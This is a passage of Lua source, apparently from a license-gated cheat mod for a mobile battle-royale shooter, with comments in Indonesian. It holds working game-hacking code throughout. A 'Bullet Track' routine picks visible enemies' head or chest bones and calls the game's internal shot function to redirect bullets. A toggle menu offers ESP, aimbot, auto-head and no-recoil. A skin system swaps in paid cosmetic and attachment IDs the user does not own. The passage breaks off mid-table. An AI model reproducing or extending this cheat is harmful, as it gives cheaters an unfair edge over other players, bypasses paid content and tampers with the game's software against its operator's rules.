                LocalPlayer.bIsDeadFlag = false
            end
        end
    end)
end

_G.InitAllModSystems = InitAllModSystems

if not isExpired and _G.IsLicenseOK and _G.IsLicenseOK() then
    pcall(function() 
        require("common.time_ticker").AddTimerOnce(0.5, InitAllModSystems) 
    end)
end

-- ========================================== 
-- BAN SECTION FEATURES - SPIN MODE
-- ========================================== 
_G.spinAngle = _G.spinAngle or 0

-- ========================================== 
-- CLASS REGISTRATION
-- ========================================== 


-- Sync BT config from menu/CustomTextData <-> LexusConfig
_G.SyncBulletTrackConfig = function()
    pcall(function()
        if not _G.LexusConfig then return end
        if not _G.LexusState then _G.LexusState = {} end
        if not _G.LexusState.CustomTextData then _G.LexusState.CustomTextData = {} end
        local c = _G.LexusState.CustomTextData

        -- [FIX] LexusConfig jadi master, selalu sync ke CustomTextData
        -- biar GetCfg() di dalam ExecuteShot baca nilai terbaru

        -- FOV
        if _G.LexusConfig.BulletTrackFOV ~= nil then
            c.BtFOV = tonumber(_G.LexusConfig.BulletTrackFOV) or 80
        end

        -- AimPriority
        if _G.LexusConfig.BulletTrackTarget ~= nil then
            c.BtAimPriority = tonumber(_G.LexusConfig.BulletTrackTarget) or 2
        end

        -- MaxDist (sebelumnya tidak pernah di-sync sama sekali)
        if _G.LexusConfig.BulletTrackMaxDist ~= nil then
            c.BtMaxDist = tonumber(_G.LexusConfig.BulletTrackMaxDist) or 150
        end

        -- Toggle
        c.BtEnabled = _G.LexusConfig.BulletTrack
    end)
end

-- ==========================================
-- BULLET TRACK (PUT)
-- Logic by friend, credit PUT | syntax fixed
-- ==========================================
do
    local GameplayData = package.loaded["GameLua.GameCore.Data.GameplayData"]
        or require("GameLua.GameCore.Data.GameplayData")

    -- ── State ──
    local _btLastShootId = -1
    local _btLastWeapon  = nil
    local _btPendingFire = false
    local _btDeferFrames = 0

    -- ── Bone map (FIXED syntax) ──
    local BONE_PRIORITY = {
        [1] = {
            {"Head", "head", "Bip001-Head", "Bip01-Head"}
        },
        [2] = {
            {"spine_03", "Spine3", "chest", "Chest", "spine3", "Bip001-Spine2"}
        },
        [3] = {
            {"spine_01", "Spine1", "pelvis", "Pelvis", "Bip001-Pelvis", "Bip001-Spine"}
        },
        [4] = {
            {"Head", "head", "Bip001-Head", "Bip01-Head"},
            {"spine_03", "Spine3", "chest", "Chest", "spine3", "Bip001-Spine2"},
            {"spine_01", "Spine1", "pelvis", "Pelvis", "Bip001-Pelvis", "Bip001-Spine"},
        },
    }

    local function GetCfg(key, default)
        -- 1) CustomTextData (menu live) — prioritas tertinggi
        if _G.LexusState and _G.LexusState.CustomTextData then
            local c = _G.LexusState.CustomTextData
            if key == "BtFOV" then
                local v = c.BtFOV or c.BulletTrackFOV
                if v ~= nil then return tonumber(v) or default end
            elseif key == "BtAimPriority" then
                local v = c.BtAimPriority or c.BulletTrackTarget
                if v ~= nil then return tonumber(v) or default end
            else
                local v = c[key]
                if v ~= nil then return v end
            end
        end
        -- 2) LexusConfig (saklar / default)
        if _G.LexusConfig then
            if key == "BtFOV" then
                local v = _G.LexusConfig.BulletTrackFOV
                if v ~= nil then return tonumber(v) or default end
            elseif key == "BtAimPriority" then
                local v = _G.LexusConfig.BulletTrackTarget
                if v ~= nil then return tonumber(v) or default end
            end
        end
        -- 3) GrowState fallback
        if _G.GrowState and _G.GrowState.CustomTextData then
            local v = _G.GrowState.CustomTextData[key]
            if v ~= nil then return v end
        end
        return default
    end

    local function GetBonePos(actor, boneNames)
        local pos = nil
        for _, bone in ipairs(boneNames) do
            if not pos then
                pcall(function() pos = actor:GetBonePos(bone, {X=0,Y=0,Z=0}) end)
            end
        end
        return pos
    end

    local function GetAimPosition(actor)
        local priority = math.floor(GetCfg("BtAimPriority", 2) + 0.5)
        if priority < 1 or priority > 4 then priority = 2 end

        local boneSets = BONE_PRIORITY[priority] or BONE_PRIORITY[2]

        for _, boneNames in ipairs(boneSets) do
            local pos = GetBonePos(actor, boneNames)
            if pos then return pos end
        end

        local pos = nil
        pcall(function() pos = actor:GetHeadLocation(false) end)
        if pos then return pos end

        pcall(function()
            local loc = actor:K2_GetActorLocation()
            if loc then
                local zOffset = ({[1]=160, [2]=120, [3]=80, [4]=160})[priority] or 120
                pos = {X = loc.X, Y = loc.Y, Z = loc.Z + zOffset}
            end
        end)

        return pos
    end

    local function GetEnemyTargets()
        local result = {}
        local player = GameplayData.GetPlayerCharacter()
        if not slua.isValid(player) then return result end

        local myTeam = 0
        pcall(function() myTeam = player:GetTeamID() or 0 end)

        pcall(function()
            local ASTExtra = import("STExtraPlayerCharacter")
            if not ASTExtra then return end
            local actors = Game:GetActorsByClass(ASTExtra)
            if not actors then return end
            local count = actors:Num() or 0
            for i = 0, count - 1 do
                local actor = actors:Get(i)
                if slua.isValid(actor) and actor ~= player then
                    local team = 0
                    pcall(function() team = actor:GetTeamID() or 0 end)
                    if team ~= myTeam then
                        local alive = true
                        pcall(function()
                            if actor.IsAlive then alive = actor:IsAlive() end
                            if actor.IsDead and actor:IsDead() then alive = false end
                            if actor.HealthStatus == 2 then alive = false end
                        end)
                        if alive then table.insert(result, actor) end
                    end
                end
            end
        end)

        if #result == 0 then
            pcall(function()
                local chars = GameplayData.GetAllPlayerCharacters and GameplayData.GetAllPlayerCharacters()
                if not chars then return end
                for _, c in pairs(chars) do
                    if slua.isValid(c) and c ~= player then
                        local team = 0
                        pcall(function()
                            team = (c.GetTeamID and c:GetTeamID()) or (c.TeamID or 0)
                        end)
                        local hp = 1
                        pcall(function() hp = c.Health or 1 end)
                        if team ~= myTeam and hp > 0 then
                            table.insert(result, c)
                        end
                    end
                end
            end)
        end

        return result
    end

    local function ExecuteShot(player, weapon, pc, camLoc)
        pcall(function()
            local shootComp = weapon.ShootWeaponComponent
            if not shootComp then return end

            local curId = shootComp.CurShootID or -1
            if curId == _btLastShootId then return end
            _btLastShootId = curId

            local ui_util = require("client.common.ui_util")
            if not ui_util then return end
            local vp = ui_util.GetViewportSize()
            if not vp then return end
            local cx = vp.X * 0.5
            local cy = vp.Y * 0.5

            -- FOV 0-100 = pixel radius langsung (1 = 1px)
            local fovVal = tonumber(GetCfg("BtFOV", 80)) or 80
            if fovVal < 0 then fovVal = 0 end
            if fovVal > 100 then fovVal = 100 end
            local fovRadius = fovVal
            if fovRadius < 1 then fovRadius = 1 end

            local enemies = GetEnemyTargets()
            local bestDist   = 99999
            local bestAimPos = nil

            for _, enemy in pairs(enemies) do
                if slua.isValid(enemy) then
                    local isAlive = false
                    pcall(function() isAlive = enemy:IsAlive() end)
                    if not isAlive then goto continue end

                    local knocked = false
                    pcall(function()
                        if enemy.IsNearDeath then knocked = enemy:IsNearDeath() end
                        if enemy.HealthStatus == 1 then knocked = true end
                    end)
                    if knocked then goto continue end

                    local vis = false
                    pcall(function() vis = pc:LineOfSightTo(enemy, camLoc, true) end)
                    if not vis then goto continue end

                    local aimPos = GetAimPosition(enemy)
                    if not aimPos then goto continue end

                    local screen = import("Vector2D")()
                    local ok = pc:ProjectWorldLocationToScreen(aimPos, screen, false)
                    if not ok then goto continue end
                    if screen.X <= 0 or screen.Y <= 0 then goto continue end

                    local dx = screen.X - cx
                    local dy = screen.Y - cy
                    local d  = math.sqrt(dx*dx + dy*dy)

                    if d > fovRadius then goto continue end

                    if d < bestDist then
                        bestDist   = d
                        bestAimPos = aimPos
                    end

                    ::continue::
                end
            end

            if not bestAimPos then return end

            local muzzlePos = nil
            pcall(function()
                local weaponEntity = weapon.ShootWeaponEntityComp or weapon.ShootWeaponEntity
                if weaponEntity and weaponEntity.GetMuzzleLocation then
                    muzzlePos = weaponEntity:GetMuzzleLocation()
                end
            end)

            if not muzzlePos then
                pcall(function()
                    local weaponLoc = weapon:K2_GetActorLocation()
                    local weaponRot = weapon:K2_GetActorRotation()
                    if weaponLoc and weaponRot then
                        local forward = nil
                        pcall(function()
                            if weaponRot.GetForwardVector then
                                forward = weaponRot:GetForwardVector()
                            end
                        end)
                        if not forward then
                            local KML = import("KismetMathLibrary")
                            if KML and KML.GetForwardVector then
                                forward = KML.GetForwardVector(weaponRot)
                            end
                        end
                        if forward then
                            muzzlePos = {
                                X = weaponLoc.X + forward.X * 150,
                                Y = weaponLoc.Y + forward.Y * 150,
                                Z = weaponLoc.Z + forward.Z * 50
                            }
                        end
                    end
                end)
            end

            if not muzzlePos and camLoc then
                muzzlePos = { X = camLoc.X, Y = camLoc.Y, Z = camLoc.Z }
            end

            if not muzzlePos then
                pcall(function()
                    muzzlePos = player:GetBonePos("head", {X=0,Y=0,Z=0})
                    if muzzlePos then muzzlePos.Z = muzzlePos.Z - 20 end
                end)
            end

            if not muzzlePos then return end

            local rot = nil
            pcall(function()
                local KML = import("KismetMathLibrary")
                if KML and KML.FindLookAtRotation then
                    rot = KML.FindLookAtRotation(muzzlePos, bestAimPos)
                end
            end)
            if not rot then return end

            local spread = 0.0003
            pcall(function()
                rot.Pitch = rot.Pitch + (math.random() - 0.5) * spread
                rot.Yaw   = rot.Yaw   + (math.random() - 0.5) * spread
            end)

            if shootComp.ShootBulletInner then
                shootComp:ShootBulletInner(bestAimPos, rot, curId)
            end
        end)
    end

    local function BulletTrack()
        if not (_G.LexusConfig and _G.LexusConfig.BulletTrack) then
            _btPendingFire = false
            _btDeferFrames = 0
            return
        end
        if _G.SyncBulletTrackConfig then _G.SyncBulletTrackConfig() end

        pcall(function()
            local player = GameplayData.GetPlayerCharacter()
            if not slua.isValid(player) then return end

            local wm = player.WeaponManagerComponent
            if not wm then return end
            local weapon = wm.CurrentWeaponReplicated
            if not slua.isValid(weapon) then
                _btLastWeapon  = nil
                _btLastShootId = -1
                _btPendingFire = false
                _btDeferFrames = 0
                return
            end

            if weapon ~= _btLastWeapon then
                _btLastWeapon  = weapon
                _btLastShootId = -1
                _btPendingFire = false
                _btDeferFrames = 0
            end

            local pc = player:GetPlayerControllerSafety()
            if not slua.isValid(pc) then return end

            local camManager = import("GameplayStatics").GetPlayerCameraManager(pc, 0)
            if not slua.isValid(camManager) then return end
            local camLoc = camManager:GetCameraLocation()
            if not camLoc then return end

            local shootComp = weapon.ShootWeaponComponent
            if not shootComp then return end
            local curId = shootComp.CurShootID or -1

            local newShot = (curId ~= _btLastShootId and curId ~= -1)
                         or (player.bIsWeaponFiring == true)

            if newShot and not _btPendingFire then
                _btPendingFire = true
                _btDeferFrames = 1
                return
            end

            if _btPendingFire then
                if _btDeferFrames > 0 then
                    _btDeferFrames = _btDeferFrames - 1
                    return
                end
                _btPendingFire = false
                ExecuteShot(player, weapon, pc, camLoc)
            end
        end)
    end

    if not _G._PUT_BulletTrackRunning then
        _G._PUT_BulletTrackRunning = true
        pcall(function()
            local ticker = require("common.time_ticker")
            local function _btLoop()
                pcall(BulletTrack)
                if ticker and ticker.AddTimerOnce then
                    ticker.AddTimerOnce(0.016, _btLoop)
                end
            end
            if ticker and ticker.AddTimerOnce then
                ticker.AddTimerOnce(0.5, _btLoop)
            end
        end)
        print("[PUT] BulletTrack loop started")
    end
end
-- ========== END BULLET TRACK (PUT) ==========


-- Ensure PUT menu + BT visible in LOBBY settings
pcall(function()
    if _G._PUT_MenuLobbyInit then return end
    _G._PUT_MenuLobbyInit = true
    local ok, ticker = pcall(require, "common.time_ticker")
    if ok and ticker and ticker.AddTimerOnce then
        for _, d in ipairs({1, 3, 6, 12}) do
            ticker.AddTimerOnce(d, function()
                pcall(function()
                    if _G.IsLicenseOK and _G.IsLicenseOK() and _G.InitModMenuTab then
                        _G.InitModMenuTab()
                    end
                end)
            end)
        end
    end
end)


-- PUT BASIC MENU (sederhana) — popup in-game, tanpa widget ribet
-- Buka: _G.OpenPUTMenu()
-- ==============================================================================
_G.PUTBasic = _G.PUTBasic or { tab = 1, idx = 1 }

local function pb_list()
    return {
        { "ESP", {
            {"ESP VIP", "EspVip"}, {"ESP Distance", "EspDistance"}, {"ESP Pro", "EspVipPro"},
            {"ESP Radar", "EspRadar"}, {"ESP Outline", "EspOutline"},
        }},
        { "AIMBOT", {
            {"AutoHead", "AutoHead"}, {"Aimbot", "CustomAimbot"}, {"Bullet Track", "BulletTrack"},
            {"Magic Bullet", "CustomMagicBullet"},
        }},
        { "SKIN", {
            {"Mod Skin (Inventory)", "ModSkin"}, {"Skin DeadBox", "SkinDeadBox"},
            {"Skin Attachment", "SkinAttachment"}, {"Kill Counter UI", "KillCountUI"},
            {"Kill Message", "KillMessage"},
        }},
        { "VISUAL", {
            {"Unlock FPS", "UnlockFPS"}, {"iPad View", "IpadView"}, {"Less Shake", "LessShake"},
            {"Remove Grass", "RemoveGrass"},
        }},
        { "WEAPON", {
            {"No H-Recoil", "CustomHRecoil"}, {"No V-Recoil", "CustomVRecoil"},
        }},
    }
end

local function pb_tip(s)
    pcall(function()
        local M = require("client.slua.logic.common.logic_common_msg_box")
        if M and M.ShowTip then M.ShowTip(tostring(s)) end
    end)
end

local function pb_toggle(key)
    if not _G.LexusConfig or not key then return end
    _G.LexusConfig[key] = not _G.LexusConfig[key]
    if key == "ModSkin" then
        _G._PUT_MatchSkinReady = false
        _G._PUT_LastFullSkin = 0
    end
    if _G.PUT_SaveConfig then _G.PUT_SaveConfig() end
    pb_tip(key .. " = " .. (_G.LexusConfig[key] and "ON" or "OFF"))
end

local function pb_on_ok()
    local L = pb_list()
    local b = _G.PUTBasic
    local tab = L[b.tab]
    if tab then
        local row = tab[2][b.idx]
        if row then pb_toggle(row[2]) end
        b.idx = b.idx + 1
        if b.idx > #tab[2] then b.idx = 1 end
    end
    local tk = require("common.time_ticker")
    if tk and tk.AddTimerOnce then tk.AddTimerOnce(0.1, _G.OpenPUTMenu) else _G.OpenPUTMenu() end
end

local function pb_on_next()
    local L = pb_list()
    local b = _G.PUTBasic
    b.tab = b.tab + 1
    if b.tab > #L then b.tab = 1 end
    b.idx = 1
    local tk = require("common.time_ticker")
    if tk and tk.AddTimerOnce then tk.AddTimerOnce(0.1, _G.OpenPUTMenu) else _G.OpenPUTMenu() end
end

function _G.OpenPUTMenu()
    if not (_G.IsLicenseOK and _G.IsLicenseOK()) then
        return
    end
    local L = pb_list()
    local b = _G.PUTBasic
    if b.tab < 1 or b.tab > #L then b.tab = 1 end
    local tab = L[b.tab]
    local C = _G.LexusConfig or {}
    local lines = {
        "PUT BASIC | " .. tab[1],
        "( SHAYAN )",
        "--------------------",
    }
    local i = 1
    while i <= #tab[2] do
        local row = tab[2][i]
        local on = C[row[2]] and "ON" or "OFF"
        local m = (i == b.idx) and ">" or " "
        lines[#lines + 1] = string.format("%s%d. %s [%s]", m, i, row[1], on)
        i = i + 1
    end
    lines[#lines + 1] = "--------------------"
    lines[#lines + 1] = "OK=toggle  CLOSE=next tab"
    local body = table.concat(lines, "\n")
    pcall(function()
        local Msg = require("client.slua.logic.common.logic_common_msg_box")
        if Msg and Msg.Show then
            Msg.Show(1, "PUT MENU", body, pb_on_ok, pb_on_next, "TOGGLE", "NEXT")
        else
            pb_tip(body)
        end
    end)
end

_G.OpenPUTWidgetMenu = _G.OpenPUTMenu
_G.OpenPUTFloatMenu = _G.OpenPUTMenu
-- ======================== END PUT BASIC MENU ========================




-- ============================================================================
-- PUT SKIN ONLY (Add-Outfit V7.5) — integrated
-- ============================================================================
-- ==============================================================================
-- PUT SKIN ONLY — full logic dari BRPlayerCharacterBase
-- Sumber: CORE ADD-OUTFIT V7.5 + toggle LexusConfig.ModSkin / SkinDeadBox / SkinAttachment
-- Cara pakai: require / paste ke character base, pastikan _G.LexusConfig.ModSkin = true
-- ==============================================================================

_G.LexusConfig = _G.LexusConfig or {}
_G.LexusConfig.ModSkin = _G.LexusConfig.ModSkin or false
_G.LexusConfig.SkinDeadBox = _G.LexusConfig.SkinDeadBox or false
_G.LexusConfig.SkinAttachment = _G.LexusConfig.SkinAttachment or false
_G.LexusConfig.SkinOpenLink = _G.LexusConfig.SkinOpenLink or false

-- ================= MULAI CORE ADD-OUTFIT V7.5 (SISTEM SKIN) =================
-- ==============================================================================
-- Tabel map ID aksesoris asli ke index array
_G.BaseAttachToIndex = {
    [201010]=1, [201005]=1, [201004]=1, [201009]=2, [201003]=2, [201002]=2, 
    [201011]=3, [201007]=3, [201006]=3, [204012]=4, [204005]=4, [204008]=4, 
    [204011]=5, [204004]=5, [204007]=5, [204013]=6, [204006]=6, [204009]=6, 
    [203001]=7, [203002]=8, [203003]=9, [203014]=10, [203004]=11, [203015]=12, [203005]=13, 
    [202002]=14, [202001]=15, [202004]=16, [202005]=17, [202007]=18, [202006]=19, 
    [205002]=20, [205003]=20, [205001]=20, [203018]=21, [204014]=22 
}

-- TEMPELKAN ID AKSESORIS ANDA DI DALAM KURUNG BAWAH INI ↓↓↓
_G.VIP_Attachments = {
    [1101004236]={1010042307,1010042306,1010042308,1010042304,1010042300,1010042305,1010042299,1010042298,1010042297,1010042296,1010042295,1010042294,0,1010042314,1010042309,1010042316,1010042317,1010042318,1010042310,1010042315,1010042319,0},
    [1101001116]={1010011106,1010011107,1010011108,0,1010011109,1010011112,1010011105,1010011104,1010011103,0,1010011102,0,0,0,0,0,0,0,0,0,0,0},
    [1101001128]={1010011232,1010011233,1010011234,1010011228,1010011227,1010011229,1010011226,1010011225,1010011224,1010011223,1010011222,0,0,0,0,0,0,0,0,0,0,0},
    [1101001154]={1010011487,1010011488,1010011489,1010011493,1010011490,1010011494,1010011486,1010011485,1010011484,1010011483,1010011482,1010011497,0,0,0,0,0,0,0,0,1010011498,0},
    [1101001174]={1010011667,1010011668,1010011669,1010011673,1010011670,1010011674,1010011666,1010011665,1010011664,1010011663,1010011662,0,0,0,0,0,0,0,0,0,0,0},
    [1101001213]={1010012067,1010012068,1010012069,1010012072,1010012070,1010012073,1010012066,1010012065,1010012064,1010012063,1010012062,0,0,0,0,0,0,0,0,0,1010012074,0},
    [1101001231]={1010012267,1010012268,1010012269,1010012273,1010012272,1010012274,1010012266,1010012265,1010012264,1010012263,1010012262,1010012075,0,0,0,0,0,0,0,0,1010012275,0},
    [1101001242]={1010012357,1010012358,1010012359,1010012363,1010012362,1010012364,1010012356,1010012355,1010012354,1010012353,1010012352,1010012276,0,0,0,0,0,0,0,0,1010012365,0},
    [1101001249]={1010012437,1010012438,1010012439,1010012443,1010012442,1010012444,1010012436,1010012435,1010012434,1010012433,1010012432,1010012366,0,0,0,0,0,0,0,0,1010012445,0},
    [1101001256]={1010012588,1010012589,1010012590,1010012593,1010012592,1010012594,1010012587,1010012586,1010012585,1010012584,1010012583,1010012582,0,0,0,0,0,0,0,0,1010012595,0},
    [1101001265]={1010012698,1010012699,1010012700,1010012703,1010012702,1010012704,1010012697,1010012696,1010012695,1010012694,1010012693,1010012692,0,0,0,0,0,0,0,0,1010012705,0},
    [1101001276]={1010012698,1010012699,1010012700,1010012703,1010012702,1010012704,1010012697,1010012696,1010012695,1010012694,1010012693,1010012692,0,0,0,0,0,0,0,0,1010012705,0},
    [1101002029]={1010020249,1010020250,1010020255,1010020247,1010020246,1010020248,1010020240,1010020239,1010020238,1010020237,1010020236,1010020235,0,0,0,0,0,0,0,1010020257,1010020256,1010020258},
    [1101002056]={1010020519,0,0,1010020517,1010020516,1010020518,1010020500,1010020509,1010020508,1010020507,1010020506,1010020505,0,0,0,0,0,0,0,0,0,0},
    [1101002081]={1010020768,1010020769,1010020770,1010020766,1010020760,1010020767,1010020759,1010020758,1010020757,1010020756,1010020755,1010020776,0,0,0,0,0,0,0,1010020775,1010020777,1010020778},
    [1101003070]={1010030654,1010030653,1010030655,1010030649,1010030648,1010030650,1010030647,1010030646,1010030645,1010030644,1010030643,1010030642,0,1010030658,1010030656,1010030660,1010030662,1010030659,1010030657,0,1010030663,0},
    [1101003080]={1010030754,1010030753,1010030755,1010030749,1010030748,1010030750,1010030747,1010030746,1010030745,1010030744,1010030743,1010030742,0,1010030758,1010030756,1010030760,1010030762,1010030759,1010030757,0,1010030763,0},
    [1101003099]={1010030943,1010030944,1010030945,1010030939,1010030938,1010030942,1010030937,1010030936,1010030935,1010030934,1010030933,1010030932,0,1010030947,1010030946,1010030948,1010030949,1010030953,1010030952,0,1010030955,0},
    [1101003119]={1010031139,1010031140,1010031142,1010031138,1010031137,1010031146,1010031136,1010031135,1010031134,1010031133,1010031132,0,0,1010031144,1010031143,0,0,0,1010031145,0,0,0},
    [1101003146]={1010031229,1010031230,1010031237,1010031228,1010031227,1010031242,1010031226,1010031225,1010031224,1010031223,1010031222,0,0,1010031239,1010031238,0,0,0,1010031240,0,0,0},
    [1101003167]={1010031609,1010031610,1010031613,1010031608,1010031607,1010031617,1010031606,1010031605,1010031604,1010031603,1010031602,1010031618,0,1010031615,1010031614,1010031620,1010031622,1010031619,1010031616,0,1010031623,0},
    [1101003181]={1010031765,1010031764,1010031766,1010031759,1010031758,1010031763,1010031757,1010031756,1010031755,1010031754,1010031753,1010031752,0,1010031769,1010031767,1010031773,1010031774,1010031772,1010031768,0,1010031775,0},
    [1101003195]={1010031912,1010031911,1010031913,1010031908,1010031907,1010031909,1010031906,1010031905,1010031904,1010031903,1010031902,1010031901,0,1010031916,1010031914,1010031918,1010031919,1010031917,1010031915,0,1010031921,0},
    [1101003208]={1010032034,1010032033,1010032045,1010032029,1010032028,1010032032,1010032027,1010032026,1010032025,1010032024,1010032023,1010032022,0,1010032038,1010032036,1010032042,1010032043,1010032039,1010032037,0,1010032044,0},
    [1101004046]={1010040474,1010040475,1010040476,1010040472,1010040471,1010040473,1010040470,1010040469,1010040468,1010040467,1010040466,1010040481,0,1010040479,1010040477,1010040482,1010040483,1010040484,1010040478,1010040480,1010040485,0},
    [1101004062]={1010040578,1010040577,1010040579,1010040575,1010040570,1010040576,1010040569,1010040568,1010040567,1010040566,1010040565,1010040564,0,1010040585,1010040580,1010040587,1010040588,1010040589,1010040584,1010040586,1010040590,1010040594},
    [1101004098]={1010040924,1010040926,1010040925,0,1010040937,1010040938,1010040935,1010040934,1010040929,1010040928,1010040927,0,0,1010040939,1010040945,0,0,0,1010040944,1010040936,0,0},
    [1101004138]={1010041136,1010041137,1010041138,1010041134,1010041129,1010041135,1010041128,1010041127,1010041126,1010041125,1010041124,0,0,1010041145,1010041139,0,0,0,1010041144,1010041146,0,0},
    [1101004163]={1010041570,1010041574,1010041575,1010041568,1010041567,1010041569,1010041566,1010041565,1010041564,1010041560,1010041554,0,0,1010041578,1010041576,0,0,0,1010041577,1010041579,0,0},
    [1101004201]={1010041956,1010041957,1010041958,1010041950,1010041949,1010041955,1010041948,1010041947,1010041946,1010041945,1010041944,1010041967,0,1010041965,1010041959,0,0,0,1010041960,1010041966,0,0},
    [1101004209]={1010042038,1010042037,1010042039,1010042035,1010042034,1010042036,1010042029,1010042028,1010042027,1010042026,1010042025,1010042024,0,1010042046,1010042044,1010042048,1010042049,1010042054,1010042045,1010042047,1010042055,0},
    [1101004218]={1010042128,1010042127,1010042129,1010042125,1010042124,1010042126,1010042119,1010042118,1010042117,1010042116,1010042115,1010042114,0,1010042136,1010042134,1010042138,1010042139,1010042144,1010042135,1010042137,1010042145,0},
    [1101004226]={1010042238,1010042237,1010042239,1010042235,1010042234,1010042236,1010042233,1010042232,1010042231,1010042219,1010042218,1010042217,0,1010042243,1010042241,1010042245,1010042246,1010042247,1010042242,1010042244,1010042248,0},
    [1101004246]={1010042406,1010042407,1010042408,1010042404,1010042400,1010042405,1010042399,1010042398,1010042397,1010042396,1010042395,1010042394,0,1010042414,1010042409,1010042416,1010042417,1010042418,1010042410,1010042415,1010042419,1010042420},
    [1101005038]={0,0,1010050327,1010050329,1010050328,1010050330,1010050326,1010050325,1010050324,1010050323,1010050322,1010050334,0,0,0,0,0,0,0,0,0,0},
    [1101005052]={0,0,1010050467,1010050469,1010050468,1010050470,1010050466,1010050465,1010050464,1010050463,1010050462,1010050473,0,0,0,0,0,0,0,0,0,0},
    [1101005098]={0,0,1010050928,1010050930,1010050929,1010050932,1010050927,1010050926,1010050925,1010050924,1010050923,1010050922,0,0,0,0,0,0,0,0,0,0},
    [1101006062]={1010060573,1010060572,1010060574,1010060564,1010060563,1010060571,1010060562,1010060561,1010060554,1010060553,1010060552,1010060551,0,1010060583,1010060581,1010060591,1010060592,1010060584,1010060582,0,1010060593,0},
    [1101006075]={1010060702,1010060701,1010060703,1010060698,1010060697,1010060699,1010060696,1010060695,1010060694,1010060693,1010060692,1010060691,0,1010060706,1010060704,1010060708,1010060709,1010060707,1010060705,0,1010060711,0},
    [1101006085]={1010060796,1010060795,1010060797,1010060793,1010060789,1010060794,1010060788,1010060787,1010060786,1010060785,1010060784,1010060783,0,1010060800,1010060798,1010060804,1010060805,1010060803,1010060799,0,1010060806,0},
    [1101007046]={1010070410,1010070413,1010070414,1010070408,1010070407,1010070409,1010070406,1010070405,1010070404,1010070403,1010070402,1010070418,0,1010070417,1010070415,1010070420,1010070422,1010070419,1010070416,0,1010070423,0},
    [1101007062]={1010070579,1010070578,1010070581,1010070576,1010070575,1010070577,1010070574,1010070573,1010070572,1010070571,1010070569,1010070568,0,1010070584,1010070582,1010070585,1010070586,1010070587,1010070583,0,1010070588,0},
    [1101007071]={1010070663,1010070662,1010070664,1010070659,1010070658,1010070660,1010070657,1010070656,1010070655,1010070654,1010070653,1010070652,0,1010070667,1010070665,1010070668,1010070669,1010070670,1010070666,0,1010070672,0},
    [1101008051]={1010080463,1010080464,1010080465,1010080459,1010080458,1010080462,1010080457,1010080456,1010080455,1010080454,1010080453,1010080452,0,1010080467,1010080466,1010080468,1010080469,1010080473,1010080472,0,1010080475,0},
    [1101008061]={1010080563,1010080564,1010080565,1010080559,1010080558,1010080562,1010080557,1010080556,1010080555,1010080554,1010080553,0,0,1010080567,1010080566,0,0,0,1010080572,0,0,0},
    [1101008070]={1010080609,1010080612,1010080613,1010080608,1010080607,1010080617,1010080606,1010080605,1010080604,1010080603,1010080602,0,0,1010080615,1010080614,0,0,0,1010080616,0,0,0},
    [1101008081]={1010080740,1010080743,1010080745,1010080738,1010080737,1010080739,1010080736,1010080735,1010080734,1010080733,1010080732,1010080748,0,1010080747,1010080746,1010080750,1010080752,1010080749,1010080744,0,1010080753,0},
    [1101008104]={1010080980,1010080982,1010080984,1010080978,1010080977,1010080979,1010080976,1010080975,1010080974,1010080973,1010080972,1010080992,0,1010080986,1010080985,1010080989,1010080987,1010080993,1010080983,0,1010080988,0},
    [1101008116]={1010081110,1010081112,1010081114,1010081108,1010081107,1010081109,1010081106,1010081105,1010081104,1010081103,1010081102,0,0,1010081116,1010081115,0,0,0,1010081113,0,0,0},
    [1101008126]={1010081210,1010081225,1010081226,1010081208,1010081207,1010081209,1010081206,1010081205,1010081204,1010081203,1010081202,1010081218,0,1010081217,1010081216,1010081219,1010081220,1010081222,1010081214,1010081228,1010081227,1010081229},
    [1101008136]={1010081314,1010081315,1010081316,1010081312,1010081308,1010081313,1010081307,1010081306,1010081305,1010081304,1010081303,1010081302,0,1010081318,1010081317,1010081322,1010081323,1010081325,1010081324,0,1010081326,0},
    [1101008146]={1010081401,1010081402,1010081403,1010081398,1010081397,1010081399,1010081396,1010081395,1010081394,1010081393,1010081392,1010081391,0,1010081405,1010081404,1010081406,1010081407,1010081409,1010081408,0,1010081411,0},
    [1101008154]={1010081531,1010081532,1010081533,1010081528,1010081527,1010081529,1010081526,1010081525,1010081524,1010081523,1010081522,1010081521,0,1010081541,1010081534,1010081542,1010081543,1010081545,1010081544,0,1010081546,0},
    [1101008163]={1010081582,1010081583,1010081584,1010081579,1010081578,1010081580,1010081577,1010081576,1010081575,1010081574,1010081573,1010081572,0,1010081586,1010081585,1010081587,1010081588,1010081590,1010081589,0,1010081592,0},
    [1101012033]={1010120284,1010120285,1010120286,1010120280,1010120279,1010120283,1010120278,1010120277,1010120276,1010120275,1010120274,1010120273,0,0,0,0,0,0,0,0,1010120287,0},
    [1101100012]={1011000066,1011000067,1011000068,0,0,0,1011000058,1011000057,1011000056,1011000055,1011000054,1011000053,0,0,0,0,0,0,0,0,1011000073,0},
    [1101102007]={1011010025,1011010024,1011010026,1011010020,1011010019,1011010023,1011010018,1011010017,1011010016,1011010015,1011010014,1011010013,0,0,0,0,0,0,0,0,1011010027,0},
    [1101102017]={1011020027,1011020028,1011020029,1011020025,1011020024,1011020026,1011020019,1011020018,1011020017,1011020016,1011020015,1011020014,0,1011020036,1011020034,1011020038,1011020039,1011020044,1011020035,1011020037,1011020045,1011020047},
    [1101102025]={1011020127,1011020128,1011020129,1011020125,1011020124,1011020126,1011020119,1011020118,1011020117,1011020116,1011020115,1011020114,0,1011020136,1011020134,1011020138,1011020139,1011020144,1011020135,1011020137,1011020145,0},
    [1101102041]={1011020214,1011020215,1011020216,1011020212,1011020211,1011020213,1011020209,1011020208,1011020207,1011020206,1011020205,1011020204,0,1011020219,1011020217,1011020222,1011020223,1011020224,1011020218,1011020221,1011020225,1011020229},
    [1101102049]={1011020356,1011020357,1011020358,1011020354,1011020350,1011020355,1011020349,1011020348,1011020347,1011020346,1011020345,1011020344,0,1011020364,1011020359,1011020366,1011020367,1011020368,1011020360,1011020365,1011020369,1011020370},
    [1101101007]={1011020436,1011020437,1011020438,1011020434,1011020430,1011020435,1011020429,1011020428,1011020427,1011020426,1011020425,1011020424,0,1011020444,1011020439,1011020446,1011020447,1011020448,1011020440,1011020445,1011020449,1011020450},
    [1102001120]={1020011137,1020011138,1020011139,1020011135,1020011134,1020011136,1020011133,1020011132,0,0,0,0,0,0,0,0,0,0,0,1020011142,0,0},
    [1102001130]={1020011247,1020011248,1020011249,1020011245,1020011244,1020011246,1020011243,1020011242,0,0,0,0,0,0,0,0,0,0,0,1020011250,0,0},
